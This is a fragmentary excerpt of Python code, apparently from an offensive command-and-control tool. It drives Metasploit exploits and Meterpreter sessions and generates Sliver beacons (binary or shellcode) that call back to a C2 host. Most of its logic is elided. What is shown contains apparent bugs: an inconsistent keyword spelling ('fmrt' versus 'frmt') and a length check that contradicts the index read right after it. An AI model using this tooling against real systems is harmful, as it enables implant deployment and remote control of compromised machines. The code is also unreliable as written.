...
def interact_meterpreter(session_id, command):
    ...
    if command == "transfer-sliver":
        beacon_path = generate_beacon("5", "10", SLIVER_HOST, "linux", "amd64", "sliver_beacon", frmt="bin")
        if not beacon_path:
...
def run_msf_exploit(mtype, mname, user_params, c2="metasploit"):
    ...
    if c2 == "sliver":
        ...
        beacon_path = generate_beacon("5", "0", SLIVER_HOST, "linux", "amd64", "sliver_beacon", fmrt="shellcode")
        if not beacon_path:
...
def handle_message(data, client_address):
    ...
    if command == "create_beacon": 
        ...
        if len(options) < 2:
            ...
            session_id, meterpreter_command = options[1], options[2]
            try:
                session = msfInstance.sessions.session(session_id)
